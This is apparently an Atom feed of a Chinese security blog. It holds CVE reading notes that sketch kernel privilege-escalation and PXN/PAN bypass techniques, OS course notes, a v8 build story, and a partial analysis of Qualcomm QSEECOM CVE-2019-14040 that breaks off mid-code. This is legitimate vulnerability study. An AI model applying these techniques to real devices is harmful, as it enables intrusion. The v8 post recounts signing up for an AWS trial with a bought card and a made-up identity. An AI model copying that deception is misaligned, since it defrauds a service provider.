rel="noopener">https://paper.seebug.org/1188/</a></p><h2 id="iOS-xml-parser-0day"><a href="#iOS-xml-parser-0day" class="headerlink" title="iOS xml-parser 0day"></a>iOS xml-parser 0day</h2><p><a href="https://siguza.github.io/psychicpaper/" target="_blank" rel="noopener">https://siguza.github.io/psychicpaper/</a></p><blockquote><p>a good portion of dumb luck.</p></blockquote><p>太秀了，卡iOS 不同xml-parser的bug，好像是因为用命令行版XCode发现的，天降0day。</p><h2 id="利用CVE-2017-8890实现linux内核提权"><a href="#利用CVE-2017-8890实现linux内核提权" class="headerlink" title="利用CVE-2017-8890实现linux内核提权"></a>利用CVE-2017-8890实现linux内核提权</h2><p><a href="https://xz.aliyun.com/t/2383#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2383#toc-1</a></p><p>是一个double free，一个水水的double free，由于它把所有保护都关了，所以直接堆喷，堆块重合以后，劫持eip到用户空间，然后它恰好有一个函数指针在流程上会执行，直接就执行了shellcode。</p><h2 id="利用ARM-MMU硬件特性开启安卓8终端的上帝模式"><a href="#利用ARM-MMU硬件特性开启安卓8终端的上帝模式" class="headerlink" title="利用ARM MMU硬件特性开启安卓8终端的上帝模式"></a>利用ARM MMU硬件特性开启安卓8终端的上帝模式</h2><p><a href="https://www.secpulse.com/archives/72636.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/72636.html</a></p><p>绕过PXN，PAN。</p><p>绕过PXN：</p><ul><li>bypass PXN 常规方法，构建内核ROP<ul><li>第一，ROP 链的执行很难兼顾到内核栈的平衡，这为内核的后续运行埋下了不安定因素</li><li>第二，构建 ROP 链时使用的 gadgets 寻找起来比较麻烦</li><li>最后，构建好的 ROP 链很难做到通用，原因仍是 Android 的碎片化。</li></ul></li><li>set_fs(old_fs)；通过bug或者什么手段阻止它关掉</li><li>操作ioctl之类的file_operations</li><li>用kernel_sock_ioctl的地址来替代pmu_disable的原始地址。因为kernel_sock_ioctl可以帮助我们对任意内核空间写。kernel_setsockopt()也是这样的函数。假设我们可以执行kernel_setsockopt()并控制它的第一个参数（struct socket <em> sock），然后通过操作struct socket </em>sock可以跳过set_fs（oldfs）到kernel_sock_ioctl结尾。</li></ul><p>本文方法，把没有用到的虚拟地址映射到物理地址上，改行可读可写权限，就可以上帝模式操纵内核，无视PXN、PAN了。</p><h2 id="cve-2015-6620学习总结"><a href="#cve-2015-6620学习总结" class="headerlink" title="cve-2015-6620学习总结"></a>cve-2015-6620学习总结</h2><p><a href="https://bbs.pediy.com/thread-226699.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226699.htm</a></p><p>感觉好懂一些，回头手机调一下，是我的错觉嘛。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;过路CVE是指，日常逛一些论坛、博客看到的CVE，它们可能不是我的研究方向（我没有研究方向），但是就草率地看过去了就有点可惜聊。&lt;/p&gt;
&lt;h2 id=&quot;CVE-2020-3952：vCenter信息泄露漏洞分析&quot;&gt;&lt;a href=&quot;#CVE-2020-3952：vCent
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>操作系统学习笔记</title>
    <link href="https://github.com/Cracke-S-J/2020/04/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://github.com/Cracke-S-J/2020/04/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-19T10:18:48.000Z</published>
    <updated>2020-05-08T05:25:43.502Z</updated>
    
    <content type="html"><![CDATA[<p>前两天被Alpha Lab的人问的有点懵比，内核很多细节我都不懂，我决定每天拿出一个小时来先学习一下操作系统，清华大学学堂在线。学完这个会再学一下编译链接和装载，因为我忘记在哪看的jd对这些要求很高，学好了就写简历上。</p><p>其实大多数东西我是能听懂并且明白的，但是没有系统的学习总结过，知识很零散，突然问起来就容易傻逼。</p><h2 id="第一章-Kernel-内部组件"><a href="#第一章-Kernel-内部组件" class="headerlink" title="第一章 Kernel 内部组件"></a>第一章 Kernel 内部组件</h2><ul><li>cpu调度器</li><li>物理内存管理</li><li>虚拟内存管理</li><li>文件系统管理</li><li>中断处理与设备驱动</li></ul><h2 id="第二章-操作系统基本知识"><a href="#第二章-操作系统基本知识" class="headerlink" title="第二章 操作系统基本知识"></a>第二章 操作系统基本知识</h2><ul><li>启动过程<ul><li>BIOS</li><li>bootloader</li><li>OS init</li></ul></li><li>基本概念<ul><li>中断</li><li>异常</li><li>系统调用</li></ul></li><li>跨操作系统的开销<ul><li>建立中断/异常/系统调用号与对应服务例程映射关系的初始化开销</li><li>建立内核堆栈</li><li>验证参数</li><li>内核态映射到用户态的地址空间，更新页面映射权限</li><li>内核态独立地址空间，刷新TLB</li></ul></li></ul><h2 id="第三章-内存分配的基本知识"><a href="#第三章-内存分配的基本知识" class="headerlink" title="第三章 内存分配的基本知识"></a>第三章 内存分配的基本知识</h2><ul><li>编译器会处理符号地址到逻辑地址</li><li>MMU会根据TLB从逻辑地址找到物理地址</li><li>具体分配策略由操作系统定</li></ul><p>操作系统中管理内存的不同方法（还没讲）</p><ul><li>程序重定位</li><li>分段</li><li>分页</li><li>虚拟内存</li><li>按需分页虚拟内存</li><li>实现必须知道内存架构</li><li>硬件负责处理cpu访问请求</li></ul><p>讲了三种鸡肋的连续内存分配方法，和两种鸡肋的碎片整理方法。</p><p>是因为我舔狗属性么，我怎么觉得清华这课讲的这么好。（手动狗头）</p><h2 id="第四章-非连续内存分配"><a href="#第四章-非连续内存分配" class="headerlink" title="第四章 非连续内存分配"></a>第四章 非连续内存分配</h2><ul><li>分段（现在用的比较少）</li><li>分页<ul><li>页表</li><li>TLB</li><li>多级页表</li><li>反向页表（用的比较少，IBM的部分power64）</li></ul></li></ul><h2 id="第五章-虚拟内存"><a href="#第五章-虚拟内存" class="headerlink" title="第五章 虚拟内存"></a>第五章 虚拟内存</h2><ul><li>覆盖技术、交换技术（两根鸡肋）</li><li>虚存技术，swap in/out</li><li>页表表项</li><li>后备存储、swap</li></ul><h2 id="第六章-页面转换算法"><a href="#第六章-页面转换算法" class="headerlink" title="第六章 页面转换算法"></a>第六章 页面转换算法</h2><ul><li>局部页面置换算法<ul><li>OPT(最优页面置换算法，理想情况)</li><li>FIFO(鸡肋)</li><li>LRU(基于时间)</li><li>Clock<ul><li>两个bit标记，存在和脏</li><li>二次机会法</li></ul></li><li>LFU 最不常用算法(基于访问次数)</li><li>Belady现象，因为不是栈算法，这是一个科学家名，不是两个单词</li></ul></li><li>全局页面置换算法<ul><li>工作集跟常驻集要尽量重合</li><li>基于工作集的算法，往前数几个</li><li>基于缺页率</li></ul></li><li>抖动问题</li></ul><h2 id="第七章-进程相关"><a href="#第七章-进程相关" class="headerlink" title="第七章 进程相关"></a>第七章 进程相关</h2><ul><li>进程控制块</li><li>进程的生命周期</li><li>线程<ul><li>用户线程</li><li>内核线程</li><li>轻量级线程</li></ul></li><li>进程的创建、加载、等等、终止、回收</li></ul><h2 id="第八章-cpu-调度"><a href="#第八章-cpu-调度" class="headerlink" title="第八章 cpu 调度"></a>第八章 cpu 调度</h2><ul><li>调度原则</li><li>调度算法<ul><li>先来先服务</li><li>短进程优先（估算时间）</li><li>最高响应比优先</li><li>轮循（公平）</li><li>多级反馈队列</li><li>公平共享调度</li></ul></li><li>实时调度<ul><li>硬时限</li><li>软时限</li><li>速度单调调度</li><li>最早期限调度</li></ul></li><li>SMP多处理器调度</li><li>优先级反转</li></ul><h2 id="第九章-线程安全"><a href="#第九章-线程安全" class="headerlink" title="第九章 线程安全"></a>第九章 线程安全</h2><ul><li>线程安全问题背景</li><li>三个概念：临界区、同步、互斥</li><li>临界区设计方法<ul><li>禁用硬件中断<ul><li>没有中断，没有上下文切换，没有并发</li><li>进入临界区禁用中断，离开开启中断</li><li>线程无法停止，临界区任意长</li></ul></li><li>基于软件的解决方法<ul><li>Dekker算法，第一个针对双线程例子的正确解决方案</li><li>Bakery算法，针对n线程的临界区问题解决方案</li><li>需要忙等、复杂</li><li>Peterson算法需要原子的LOAD和STORE指令</li></ul></li><li>更高级的抽象<ul><li>硬件提供原语，原子操作指令<ul><li>Test-and-Set</li><li>交换</li></ul></li><li>操作系统锁、信号量</li></ul></li></ul></li></ul><h2 id="第十章"><a href="#第十章" class="headerlink" title="第十章"></a>第十章</h2><ul><li>信号量</li><li>管程</li><li>经典问题<ul><li>读者写者问题</li><li>哲学家就餐问题</li></ul></li></ul><h2 id="第十一章-死锁-进程间通信"><a href="#第十一章-死锁-进程间通信" class="headerlink" title="第十一章 死锁 进程间通信"></a>第十一章 死锁 进程间通信</h2><ul><li>死锁<ul><li>死锁预防</li><li>死锁避免</li><li>死锁检测</li><li>死锁恢复</li><li>忽略这个问题</li><li>银行家算法</li></ul></li><li>IPC<ul><li>信号</li><li>管道</li><li>消息队列</li><li>共享内存</li><li>Socket</li></ul></li></ul><h2 id="第十二章-文件系统"><a href="#第十二章-文件系统" class="headerlink" title="第十二章 文件系统"></a>第十二章 文件系统</h2><ul><li>基本概念<ul><li>文件和文件系统</li><li>文件系统的功能</li><li>文件和块</li><li>文件描述符</li><li>目录</li><li>文件别名</li><li>文件系统种类</li></ul></li><li>虚拟文件系统</li><li>数据缓存</li><li>打开文件的数据结构<ul><li>卷控制块 superblock<ul><li>每个文件系统一个</li><li>文件系统详细信息</li><li>块、块大小、空余块、计数/指针等</li></ul></li><li>文件控制块 vnode/inode<ul><li>每个文件一个</li><li>文件详细信息</li><li>许可、拥有者、大小、数据库位置等</li></ul></li><li>目录节点 dentry<ul><li>每个目录项一个（目录和文件）</li><li>将目录项数据结构及树形布局编码成树型数据结构</li><li>指向文件控制块、父节点、项目列表</li></ul></li><li>打开文件描述<ul><li>每个被打开的文件一个</li><li>文件状态信息</li><li>目录项、当前文件指针、文件操作设置等</li></ul></li><li>打开文件表<ul><li>一个进程一个</li><li>一个系统级的</li><li>每个卷控制块也会保存一个列表</li><li>所以如果有文件被打开将不能被卸载</li></ul></li></ul></li><li>数据分配<ul><li>分配方式<ul><li>连续分配</li><li>链式分配</li><li>索引分配</li></ul></li><li>指标<ul><li>高效：如存储利用（外部碎片）</li><li>表现：如访问速度</li></ul></li><li>文件头包含13个指针<ul><li>10个指向数据块</li><li>第11指向间接数据块</li><li>第12指向二重间接</li><li>第13指向三重间接</li></ul></li><li>影响<ul><li>提高了文件大小限制阈值</li><li>动态分配数据块，文件容易扩展</li><li>小文件小开销</li><li>只大文件间接</li></ul></li></ul></li><li>空闲空间列表<ul><li>指向空闲链表的指针</li><li>位图</li></ul></li><li>多磁盘管理 RAID</li><li>磁盘调度</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前两天被Alpha Lab的人问的有点懵比，内核很多细节我都不懂，我决定每天拿出一个小时来先学习一下操作系统，清华大学学堂在线。学完这个会再学一下编译链接和装载，因为我忘记在哪看的jd对这些要求很高，学好了就写简历上。&lt;/p&gt;
&lt;p&gt;其实大多数东西我是能听懂并且明白的，但是
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://github.com/Cracke-S-J/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="基础知识" scheme="https://github.com/Cracke-S-J/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>v8 编译环境搭建</title>
    <link href="https://github.com/Cracke-S-J/2020/04/18/v8%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://github.com/Cracke-S-J/2020/04/18/v8%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-04-18T10:15:18.000Z</published>
    <updated>2020-05-02T13:26:19.671Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>只要思路不滑坡，办法总比困难多。</p></blockquote><p>最近一直琢磨着挖个洞啥的，看别人分析浏览器漏洞都好羡慕，但是屡次想把v8编译环境搭起来，屡次都没有成功，今天一狠心，终于搭起来了。下面说一下我的踩坑过程。</p><p>首先上网搜了一个，大多是两种选择，要么搭全局梯子，要么用vps等海外服务器。</p><p>再说一下我的情况，没有钱、没有海外信用卡、没有梯子、只有一台没有桌面的学生版阿里云服务器的苦逼。</p><h3 id="首先我选择了搭全局梯子"><a href="#首先我选择了搭全局梯子" class="headerlink" title="首先我选择了搭全局梯子"></a>首先我选择了搭全局梯子</h3><p>穷逼的我没有梯子，到墙外一直是靠蹭公司的梯子，所以我打开了free-ss.site，找了个Japan，手机扫一下，没有问题，然后一波google怎么在没有桌面系统的情况用纯command配置代理，然后失败了，就很疑惑，坐等大佬解答<code>Failed to connect to 127.0.0.1 port 8123: Connection refused</code>呜呜呜。</p><h3 id="然后只能搞台便便宜宜vps"><a href="#然后只能搞台便便宜宜vps" class="headerlink" title="然后只能搞台便便宜宜vps"></a>然后只能搞台便便宜宜vps</h3><p>google了一波羊毛，基本都是要有海外信用卡才能薅，要么就要充个$10，显然70多软妹币的价钱我是不能接受的，然后看了一下虚拟信用卡，要先充钱，然后提现要实名认证，举着身份证照相那种，害，不靠谱不靠谱。</p><p>现在咋鸡毛办，乖乖交钱？ssj这种资深羊毛党怎么会束手就擒呢？于是我打开了某宝，几块钱买了一张虚拟信用卡，看评论说谷歌云不一定成功，ms家的云还行，aws成功率挺高，那就aws了，熟练地填上卡号，并找了一个美国大学生的身份写了上去，地址、邮编一气呵成，呵~然后我成功get了aws的试用。</p><h3 id="开始搭编译环境"><a href="#开始搭编译环境" class="headerlink" title="开始搭编译环境"></a>开始搭编译环境</h3><p>就是上网搜了搜v8怎么构建，就在所有配置都结束以后，终于开始编译，然后，我内存不够….频繁被kill……</p><h3 id="终章，成功解决问题"><a href="#终章，成功解决问题" class="headerlink" title="终章，成功解决问题"></a>终章，成功解决问题</h3><p>把aws上的v8/目录直接copy到国内server上，在国内server上装了一下依赖，直接ninja，竟然tmd成功了！果然是google，构建个项目可移植性这么ok！其实我的主要目的是用xvsa扫一下，如果没有用此方法编过，我也可以用ninja -t commands把compilation_database取出来，再魔改下xcbuild直接预处理。当然能成功编过是最好的了！</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>遇事问谷歌，再遇事问某宝，一定会解决问题。</p><h3 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h3><p>在我剽完了一切之后，我的aws被封了，5天后执行沃日哈哈哈哈，这波算不亏吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;只要思路不滑坡，办法总比困难多。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近一直琢磨着挖个洞啥的，看别人分析浏览器漏洞都好羡慕，但是屡次想把v8编译环境搭起来，屡次都没有成功，今天一狠心，终于搭起来了。下面说一下我的踩坑过程。&lt;/p&gt;
&lt;p&gt;首
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/categories/CVE/v8/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>Qualcomm QSEECOM 接口漏洞（CVE-2019-14040）分析</title>
    <link href="https://github.com/Cracke-S-J/2020/04/18/QualcommQSEECOM%E6%8E%A5%E5%8F%A3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-14040%EF%BC%89%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/Cracke-S-J/2020/04/18/QualcommQSEECOM%E6%8E%A5%E5%8F%A3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-14040%EF%BC%89%E5%88%86%E6%9E%90/</id>
    <published>2020-04-18T02:54:56.000Z</published>
    <updated>2020-05-04T14:57:49.529Z</updated>
    
    <content type="html"><![CDATA[<h2 id="致谢参考"><a href="#致谢参考" class="headerlink" title="致谢参考"></a>致谢参考</h2><ol><li><a href="https://blog.zimperium.com/multiple-kernel-vulnerabilities-affecting-all-qualcomm-devices/" target="_blank" rel="noopener">https://blog.zimperium.com/multiple-kernel-vulnerabilities-affecting-all-qualcomm-devices/</a></li><li><a href="https://paper.seebug.org/1179/" target="_blank" rel="noopener">https://paper.seebug.org/1179/</a></li><li>这是相关源码<a href="https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-crosshatch-4.9-android10/drivers/misc/qseecom.c" target="_blank" rel="noopener">https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-crosshatch-4.9-android10/drivers/misc/qseecom.c</a></li></ol><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="TEE是什么"><a href="#TEE是什么" class="headerlink" title="TEE是什么"></a>TEE是什么</h3><p>TEE即可信执行环境，全称Trusted Execution Environment。该环境可以保证不被常规的Rich OS（如Windows，Android）干扰，因此是可信的。TEE目前被用于向Rich OS提供各种各样的安全服务。TEE独立于Rich OS上的各种应用，并可以访问硬件和软件安全资源。TEE在x86/x64/ARM/ARM64上都有相关支持与实现，另一个我们比较熟悉的称呼是ARM/ARM64架构手机上的TrustZone。</p><p>讲得简单点，现在我们用的Android手机上都有指纹识别，这就需要用到TEE，因为指纹这些生物信息保存在Android系统里的话并不安全，因为手机可能被恶意应用root掉，然后里面的文件都是可以被获取查看的。因此，这就需要把一些非常隐私的数据保存在更加深的地方。</p><p>那么有多深呢？以ARM架构的Android系统为例，普通的应用进程运行在EL0层；Android系统包括系统框架、内核等代码运行在EL1层；部分设备还有虚拟化需求，那就需要在EL2层运行hypervisor；而如果要使用TEE相关技术的话，那就需要EL3层运行Secure Monitor，由该层进行安全环境（TEE kernel）与普通环境（Rich OS）的切换。</p><p>当前主流的TEE厂商与产品有：Intel的SGX，Qualcomm的QSEE，Huawei HiSilicon的Trusted Core以及Samsung的Kinibi。那么既然TEE能做到如此强的隔离，是不是其中的信息安全就坚不可破了呢？并不是，我们知道，大部分Android手机会使用高通SoC，因此上面运行的TEE Kernel就是QSEE。</p><h3 id="Qualcomm是什么"><a href="#Qualcomm是什么" class="headerlink" title="Qualcomm是什么"></a>Qualcomm是什么</h3><p>就是一个公司名，翻译过来叫“<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E9%80%9A" target="_blank" rel="noopener">高通</a>”。它应该是一个通信公司（我也不太懂）。</p><h3 id="QSEECOM是什么"><a href="#QSEECOM是什么" class="headerlink" title="QSEECOM是什么"></a>QSEECOM是什么</h3><p>QSEECOM是一种Linux内核设备，可让MediaServer（它在正常的操作系统中运行，也即“正常世界”）等通常的用户空间进程与安全操作系统下受信任的应用（也被称为trustlet，管理着受保护的服务和硬件，后者也被称为“安全世界”）进行通信。因此，“正常世界”中运行的恶意软件可以调用trustlet，利用其中的漏洞入侵设备。</p><p>媒体服务器是一个专用的计算机设备或专门的应用软件,从一个企业类提供视频点播机,,更常见的,一个小的个人电脑或NAS(网络附加存储),专门用于存储各种数字媒体(数字视频/电影,音频/音乐,和图片文件)。这也意味着这些服务器是专门用于媒体流的。</p><p>简单介绍一下这个QSEECOM接口，它是一个内核驱动连接用户态Normal world和Secure world的一个桥梁，Secure world就是我们常说的Trustzone/TEE/Security Enclav安全运行环境，Normalworld就是非安全运行环境，这个高通的QSEECOM接口可以实现一些从用户态加载/卸载一些安全的TA（TrustApplcation）到TrustZone中去运行，比如我们手机常用的指纹/人脸识别的应用，这些应用都是在TrustZone中运行的，在这种运行环境下，可以保证我们用户的关键隐私不被窃取，这个QSEECOM架构如下。</p><p>要想了解这个漏洞的成因，需要先了解这个QSEECOM接口的功能处理逻辑，用户态通过ION设备（一个内存管理器，可以通过打开/dev/ion进行访问）申请的内存可以通过QSEECOM接口映射到内核地址空间，可供内核或者TrustZone访问，而对于QSEECOM驱动模型中（/dev/qseecom）提供给用户的接口有open/close/ioctl，对应着QSEECOM内核处理函数为qseecom_open/qseecom_ioctl/qseecom_release。</p><h2 id="漏洞成因-–-这是一个-U-A-F"><a href="#漏洞成因-–-这是一个-U-A-F" class="headerlink" title="漏洞成因 – 这是一个 U A F"></a>漏洞成因 – 这是一个 U A F</h2><h3 id="Free-过程"><a href="#Free-过程" class="headerlink" title="Free 过程"></a>Free 过程</h3><p>用户态每次打开qseecom设备（/dev/qseecom），都会在内核态生成一个qseecom_dev_handle的结构指针，这个结构指针会被关闭qseecom设备（用户态通过close函数）或者来自用户的IO操作号QSEECOM_IOCTL_UNLOAD_APP_REQ请求予以销毁，先看一下这个指针的初始化过程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qseecom_open</span><span class="params">(struct inode *inode, struct file*file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">qseecom_dev_handle</span> *<span class="title">data</span>;</span></span><br><span class="line">  data = kzalloc(<span class="keyword">sizeof</span>(*data), GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!data)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  file-&gt;private_data= data;</span><br><span class="line">  data-&gt;<span class="built_in">abort</span> = <span class="number">0</span>;</span><br><span class="line">  …</span><br></pre></td></tr></table></figure><p>用户通过<code>QSEECOM_IOCTL_SET_MEM_PARAM_REQ</code> ioctl请求通过函数qseecom_set_client_mem_param来建立用户态ion内存在内核地址空间的映射，而qseecom_set_client_mem_param函数通过copy_from_user函数来获取用户传递的ion用户内存的地址信息以及这个内存的长度信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qseecom_set_client_mem_param</span><span class="params">(struct qseecom_dev_handle *data,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">void</span> __user *argp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">ion_phys_addr_t</span> pa;</span><br><span class="line">    <span class="keyword">int32_t</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qseecom_set_sb_mem_param_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="comment">/* Copy the relevant information needed for loading the image */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;req, (<span class="keyword">void</span> __user *)argp, <span class="keyword">sizeof</span>(req)))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> ((req.ifd_data_fd &lt;= <span class="number">0</span>) || (req.virt_sb_base == <span class="literal">NULL</span>) ||</span><br><span class="line">                    (req.sb_len == <span class="number">0</span>)) &#123;</span><br><span class="line">        pr_err(<span class="string">"Inavlid input(s)ion_fd(%d), sb_len(%d), vaddr(0x%pK)\n"</span>,</span><br><span class="line">            req.ifd_data_fd, req.sb_len, req.virt_sb_base);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, (<span class="keyword">void</span> __user *)req.virt_sb_base,</span><br><span class="line">            req.sb_len))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="comment">/* Get the handle of the shared fd */</span></span><br><span class="line">    data-&gt;client.ihandle = ion_import_dma_buf_fd(qseecom.ion_clnt,</span><br><span class="line">                        req.ifd_data_fd);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR_OR_NULL(data-&gt;client.ihandle)) &#123;</span><br><span class="line">        pr_err(<span class="string">"Ion client could not retrieve the handle\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Get the physical address of the ION BUF */</span></span><br><span class="line">    ret = ion_phys(qseecom.ion_clnt, data-&gt;client.ihandle, &amp;pa, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        pr_err(<span class="string">"Cannot get phys_addr for the Ion Client, ret = %d\n"</span>,</span><br><span class="line">            ret);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; req.sb_len) &#123;</span><br><span class="line">        pr_err(<span class="string">"Requested length (0x%x) is &gt; allocated (%zu)\n"</span>,</span><br><span class="line">            req.sb_len, len);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Populate the structure for sending scm call to load image */</span></span><br><span class="line">    data-&gt;client.sb_virt = (<span class="keyword">char</span> *) ion_map_kernel(qseecom.ion_clnt,</span><br><span class="line">                            data-&gt;client.ihandle);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR_OR_NULL(data-&gt;client.sb_virt)) &#123;</span><br><span class="line">        pr_err(<span class="string">"ION memory mapping for client shared buf failed\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    data-&gt;client.sb_phys = (<span class="keyword">phys_addr_t</span>)pa;</span><br><span class="line">    data-&gt;client.sb_length = req.sb_len;</span><br><span class="line">    data-&gt;client.user_virt_sb_base = (<span class="keyword">uintptr_t</span>)req.virt_sb_base;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下qseecom_dev_handle结构体，和qseecom_dev_handle-&gt;client：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">qseecom_dev_handle</span> &#123;</span></span><br><span class="line">  <span class="keyword">enum</span> qseecom_client_handle_type type;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qseecom_client_handle</span> <span class="title">client</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qseecom_listener_handle</span> <span class="title">listener</span>;</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">bool</span> released;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">qseecom_client_handle</span> &#123;</span></span><br><span class="line">  u32 app_id;</span><br><span class="line">  u8 *sb_virt;</span><br><span class="line">  <span class="keyword">phys_addr_t</span> sb_phys;</span><br><span class="line">  <span class="keyword">unsigned</span> longuser_virt_sb_base;</span><br><span class="line">  <span class="keyword">size_t</span> sb_length;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ion_handle</span> *<span class="title">ihandle</span>;</span>   <span class="comment">/*Retrieve phy addr */</span></span><br><span class="line">  charapp_name[MAX_APP_NAME_SIZE];</span><br><span class="line">  u32 app_arch;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">qseecom_sec_buf_fd_info</span> <span class="title">sec_buf_fd</span>[<span class="title">MAX_ION_FD</span>];</span></span><br><span class="line">  <span class="keyword">bool</span> from_smcinvoke;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再看一下free过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 